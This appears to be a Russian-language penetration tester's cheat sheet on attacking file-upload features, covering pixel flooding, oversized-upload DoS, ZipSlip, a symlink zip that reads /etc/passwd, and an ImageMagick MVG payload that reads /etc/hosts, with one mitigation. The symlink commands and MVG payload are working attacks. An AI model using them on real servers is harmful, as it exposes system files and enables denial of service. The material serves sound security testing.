# Some Attacks

## Video-files

Есть истории с манипуляциями длины ролика: в метаданных указываем длину ролика длиннее, чем на самом деле. В некоторых случаях, наивная оценка длины ролика при его преобразовании может сыграть злую шутку: ролик после конвертации может оказаться значительно больше, чем он есть на самом деле.

## Pixel Flooding

Подобна предыдущей атаке. Мы заливаем приложение, которое размером 200x200 пикселей, но в метаданных указано как 0xfafa x 0xfafa (64250 x 64250) пикселей. Когда сайт попытается конвертнуть такое изображение, мы получим application level DoS.

## Malicious PDF Generator

Генерим pdf с нашим url: [https://github.com/jonaslejon/malicious-pdf](https://github.com/jonaslejon/malicious-pdf)

## Загрузка больших файлов -> DoS

Приложение ограничивает максимальный размер загружаемого файла на стороне клиента, что позволяет загружать файлы большего размера, чем это запланировано разработчиками. Кроме того, приложение не ограничивает количество загружаемых файлов, что позволяет злоумышленнику загрузить большое количество произвольных файлов и вызвать отказ в обслуживании путем исчерпания дисковых квот.

## ZipSlip

Суть атаки: в zip запаковываются файлы с относительными путями. При распаковке они перетирают существующие файлы в системе.

## Zip with symlink

```
ln -s /etc/passwd test
zip -y test.zip test
-y -> отвечает за сохранение симлинков как есть
Кладем на систему целвую, потом оттуда забираем (если он там распаковывается и запаковывается)
Сохраняем, разархивируеем —> получаем файлы с целевой системы :)
```

## Есть какая-та тема с загрузкой cgi-скриптов на Apache сервер&#x20;

Они исполнятся в любом случае? (например, если приложение на Ruby, а загрузили php, или cgi)

А на Nginx?

## ImageMagick MVG

test.mvg:

```
push graphic-context 
  viewbox 0 0 800 600
  push graphic-context
    push graphic-context
      font-size 11
      fill 'white'
      stroke-width 1
      image over 1,1 800,600 'label:@/etc/hosts'
    pop graphic-context
  pop graphic-context
pop graphic-context
```

Convert:&#x20;

```
$ brew install magick
$ magick mvg:test.mvg test.png
```

Mitigation:

Запретить обработку MVG файлов: /etc/ImageMagick/policy.yml

```markup
 <policy domain="coder" rights="none" pattern="MVG" /> 
```
